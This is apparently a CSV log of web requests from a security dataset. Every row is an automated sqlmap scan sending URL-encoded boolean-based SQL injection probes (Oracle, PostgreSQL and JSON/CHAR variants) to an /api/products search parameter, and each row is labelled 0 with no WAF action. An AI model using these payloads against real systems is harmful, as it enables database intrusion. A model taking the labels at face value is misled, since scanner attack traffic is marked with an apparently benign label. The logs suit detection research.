@timestamp,auth_token_hash,method,path,path_normalized,remote_ip,request_id,response_size,response_time_ms,sampling_flag,status,upstream,user_agent,user_id_hash,user_role,waf_action,waf_rule_id,label
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%286144%3D9989%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28120%29%7C%7CCHR%28108%29%7C%7CCHR%28122%29%7C%7CCHR%28104%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL--%20GyVI,/api/products,172.20.0.10,def811c8e57cd6f928aabe9a389300af,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%288781%3D1474%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C8781%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%27uUtV%27%3D%27uUtV,/api/products,172.20.0.10,97c206d839be092071cd1ff591ae5f1e,0.0,5.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%27mmnX%27%3D%27mmnX,/api/products,172.20.0.10,87f1771524c282f9a99970478a2e42de,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%286389%3D1085%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6389%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%27qAqg%27%3D%27qAqg,/api/products,172.20.0.10,b3234ddfe403316496b22525f0bd8f37,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%284635%3D7538%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C4635%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%28%27OcvE%27%3D%27OcvE,/api/products,172.20.0.10,62f4fe734dce43e157d3873846e50cea,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%28%27hxpG%27%3D%27hxpG,/api/products,172.20.0.10,4aa16f1ea88c7000f79fb7ccdec91910,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%289529%3D2000%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C9529%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%28%27MqUV%27%3D%27MqUV,/api/products,172.20.0.10,e39d9a4479d9df6c23d06502b4822fda,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%281803%3D1685%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C1803%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%27Xzoq%27%3D%27Xzoq,/api/products,172.20.0.10,5577c029b1953d72a73d74e02dc56085,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%27rvrw%27%3D%27rvrw,/api/products,172.20.0.10,3221ed765fe4891d7182eb336a4c7a75,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%288572%3D1028%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C8572%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%27KdhO%27%3D%27KdhO,/api/products,172.20.0.10,ec0d39b028a083864fbcee58c4cd75ad,0.0,5.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%284906%3D8900%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C4906%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%27uxOe%27%20LIKE%20%27uxOe,/api/products,172.20.0.10,08c0d53c82bce7cd595b9df858749738,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%27Lymx%27%20LIKE%20%27Lymx,/api/products,172.20.0.10,5add22a512e686ce5842b7e373f68cc6,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%282408%3D3528%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C2408%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%27GEcQ%27%20LIKE%20%27GEcQ,/api/products,172.20.0.10,423221ea946d1e1457f490c5eecfa81f,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%25%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%288214%3D6360%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C8214%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%27Wlvx%25%27%3D%27Wlvx,/api/products,172.20.0.10,5baeb323d35435497da7cfb06b2f850e,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%25%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%27yDnv%25%27%3D%27yDnv,/api/products,172.20.0.10,1d10c8a5ad7c9e539de1e82499f770b6,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%25%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%286382%3D3831%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6382%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%27fgCJ%25%27%3D%27fgCJ,/api/products,172.20.0.10,8f4d5320d56fe65544e951c0ceaf1713,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%283830%3D5902%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C3830%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%27Mvgw%27%20LIKE%20%27Mvgw,/api/products,172.20.0.10,88c7d715ceccf8ee6fd85b787f3f4dc7,0.0,5.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%27kfeg%27%20LIKE%20%27kfeg,/api/products,172.20.0.10,560422a41071d96ce7a4775889c4682f,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%282177%3D5753%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C2177%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%27QLHD%27%20LIKE%20%27QLHD,/api/products,172.20.0.10,98337bfef3134fa8eb0e8e054c8005d4,0.0,7.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%22%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%288643%3D1972%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C8643%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%22Pqsx%22%3D%22Pqsx,/api/products,172.20.0.10,7516f237388be6897ff6d8ebb6f99539,0.0,7.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%22%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%22FMGd%22%3D%22FMGd,/api/products,172.20.0.10,41b952d952d2a42c9402698fb45b7313,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%22%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%284449%3D4990%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C4449%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%22IVRe%22%3D%22IVRe,/api/products,172.20.0.10,6b36c72b697a472087eb4ef73903cdc8,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%22%20AND%20%28SELECT%20%28CASE%20WHEN%20%284656%3D3904%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C4656%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%22hAcg%22%3D%22hAcg,/api/products,172.20.0.10,cf19ea79dcd06cbfec42098b998503af,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%22%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%22CZpA%22%3D%22CZpA,/api/products,172.20.0.10,389fb64bcf93487cf9c568c7f07ba16c,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%22%20AND%20%28SELECT%20%28CASE%20WHEN%20%288628%3D5356%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C8628%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%22lxNs%22%3D%22lxNs,/api/products,172.20.0.10,a258c483febf83a280483961907de84d,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%283613%3D5322%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C3613%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%287806%3D7806,/api/products,172.20.0.10,c54abb2722bfbb7141346d846ca41cb0,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%286078%3D6078,/api/products,172.20.0.10,48a135d72dd2b136d74dec958c8cc478,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%286384%3D5040%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6384%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%287675%3D7675,/api/products,172.20.0.10,7eea7117479ba7758cb6cfa3da4b53f0,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%288410%3D8196%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C8410%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%281808%3D1808,/api/products,172.20.0.10,4c374412b1acf9d3899b2651d39a98c8,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%282780%3D2780,/api/products,172.20.0.10,e41cffde7b6333790c1965b4634631ed,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%283537%3D5817%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C3537%29%20END%29%20FROM%20DUAL%29%20IS%20NULL%20AND%20%28%282411%3D2411,/api/products,172.20.0.10,01ac3112128b7170caf87326ea6c700b,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%283391%3D1968%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C3391%29%20END%29%20FROM%20DUAL%29%20IS%20NULL,/api/products,172.20.0.10,7a538d7d63ba872ebf2f84269014dbf5,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:14+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL,/api/products,172.20.0.10,2f176f3c27802ffb9269c5a09e37ba55,0.0,5.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%22%20AND%20CASE%20WHEN%209293%3D1943%20THEN%209293%20ELSE%20JSON%28CHAR%2884%2C108%2C108%2C75%29%29%20END%20AND%20%22nhDz%22%3D%22nhDz,/api/products,172.20.0.10,a7180627b27a5dd17cd792f618d085e1,0.0,6.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%285629%3D9849%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C5629%29%20END%29%20FROM%20DUAL%29%20IS%20NULL,/api/products,172.20.0.10,41746559d09d3d8b1f07a5862a740276,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%281183%3D4399%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C1183%29%20END%29%20FROM%20DUAL%29%20IS%20NULL--%20lTxr,/api/products,172.20.0.10,9543c2d35458239e9bd9440d30f41e4e,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%286670%3D6670%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C6670%29%20END%29%20FROM%20DUAL%29%20IS%20NULL--%20jJxF,/api/products,172.20.0.10,07b00dcfde7e82439de308e4e139f4cb,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%289052%3D7171%29%20THEN%20NULL%20ELSE%20CTXSYS.DRITHSX.SN%281%2C9052%29%20END%29%20FROM%20DUAL%29%20IS%20NULL--%20eElH,/api/products,172.20.0.10,a83b521b26f3cab3a798a56acefea290,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20CASE%20WHEN%209823%3D5729%20THEN%209823%20ELSE%20JSON%28CHAR%2897%2C108%2C120%2C107%29%29%20END%20AND%20%28%27pwLE%27%3D%27pwLE,/api/products,172.20.0.10,f1d90db14af224f7cf4c0bb02877560c,0.0,7.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20CASE%20WHEN%203766%3D3766%20THEN%203766%20ELSE%20JSON%28CHAR%2882%2C75%2C101%2C115%29%29%20END%20AND%20%28%27fOzZ%27%3D%27fOzZ,/api/products,172.20.0.10,699882e139cb17b621299a080450d621,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20CASE%20WHEN%204492%3D6236%20THEN%204492%20ELSE%20JSON%28CHAR%28112%2C76%2C116%2C114%29%29%20END%20AND%20%28%27Tyho%27%3D%27Tyho,/api/products,172.20.0.10,133dc80e4e013d3c132831bf8c6a92b5,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%20CASE%20WHEN%204482%3D8504%20THEN%204482%20ELSE%20JSON%28CHAR%28109%2C76%2C114%2C66%29%29%20END%20AND%20%28%28%27yxHY%27%3D%27yxHY,/api/products,172.20.0.10,ca0d990e898f0e2fcb611f9f651290d5,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%20CASE%20WHEN%203766%3D3766%20THEN%203766%20ELSE%20JSON%28CHAR%2882%2C75%2C101%2C115%29%29%20END%20AND%20%28%28%27PKEc%27%3D%27PKEc,/api/products,172.20.0.10,c5461aa0ad389d5a696688a5a8893e2b,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%20CASE%20WHEN%207055%3D5761%20THEN%207055%20ELSE%20JSON%28CHAR%28119%2C90%2C101%2C111%29%29%20END%20AND%20%28%28%27Wueo%27%3D%27Wueo,/api/products,172.20.0.10,d52f7505fc84456cf10f4d0539380434,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%20AND%20CASE%20WHEN%201564%3D5670%20THEN%201564%20ELSE%20JSON%28CHAR%2885%2C77%2C77%2C118%29%29%20END%20AND%20%27IPie%27%3D%27IPie,/api/products,172.20.0.10,ba4fb59f0dc82a3840e3ed75bf82cd17,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%20AND%20CASE%20WHEN%203766%3D3766%20THEN%203766%20ELSE%20JSON%28CHAR%2882%2C75%2C101%2C115%29%29%20END%20AND%20%27Rvsh%27%3D%27Rvsh,/api/products,172.20.0.10,1dedd8af8b97b9fc191f0551508a6c03,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%20AND%20CASE%20WHEN%201766%3D6541%20THEN%201766%20ELSE%20JSON%28CHAR%28109%2C118%2C69%2C122%29%29%20END%20AND%20%27uzzn%27%3D%27uzzn,/api/products,172.20.0.10,628493404bda6b17200fc32fd93b5838,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20CASE%20WHEN%202963%3D2186%20THEN%202963%20ELSE%20JSON%28CHAR%2878%2C71%2C67%2C81%29%29%20END%20AND%20%28%27YGiR%27%20LIKE%20%27YGiR,/api/products,172.20.0.10,773f337e615301b33e84ead7af53eaf5,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20CASE%20WHEN%203766%3D3766%20THEN%203766%20ELSE%20JSON%28CHAR%2882%2C75%2C101%2C115%29%29%20END%20AND%20%28%27oaAX%27%20LIKE%20%27oaAX,/api/products,172.20.0.10,51fd52f95e716c9021aa2b7e0b1eaf16,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20CASE%20WHEN%207441%3D2800%20THEN%207441%20ELSE%20JSON%28CHAR%2877%2C67%2C106%2C108%29%29%20END%20AND%20%28%27sLNr%27%20LIKE%20%27sLNr,/api/products,172.20.0.10,e3be1af2f1aef28e3aacf9585f679cd2,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%25%27%20AND%20CASE%20WHEN%205388%3D2187%20THEN%205388%20ELSE%20JSON%28CHAR%2888%2C81%2C119%2C86%29%29%20END%20AND%20%27fItz%25%27%3D%27fItz,/api/products,172.20.0.10,c0e59b6007bba3c85ee4c35db9230112,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%25%27%20AND%20CASE%20WHEN%203766%3D3766%20THEN%203766%20ELSE%20JSON%28CHAR%2882%2C75%2C101%2C115%29%29%20END%20AND%20%27aCqr%25%27%3D%27aCqr,/api/products,172.20.0.10,1c22f5beddf52d2dd4f2a045ed59245f,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%25%27%20AND%20CASE%20WHEN%207460%3D7381%20THEN%207460%20ELSE%20JSON%28CHAR%2879%2C113%2C104%2C110%29%29%20END%20AND%20%27VgKS%25%27%3D%27VgKS,/api/products,172.20.0.10,0545e9b719e4ceadeace25979ce8e20a,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%20AND%20CASE%20WHEN%203320%3D5960%20THEN%203320%20ELSE%20JSON%28CHAR%2887%2C115%2C83%2C65%29%29%20END%20AND%20%27eKtv%27%20LIKE%20%27eKtv,/api/products,172.20.0.10,2219fae0d8a7288eaeb5df94b9a9b08d,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:15+00:00,(empty),GET,/api/products?q=a%27%20AND%20CASE%20WHEN%203766%3D3766%20THEN%203766%20ELSE%20JSON%28CHAR%2882%2C75%2C101%2C115%29%29%20END%20AND%20%27txqx%27%20LIKE%20%27txqx,/api/products,172.20.0.10,13f3fa5a622a6fba9f697f1d8719a444,0.0,8.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
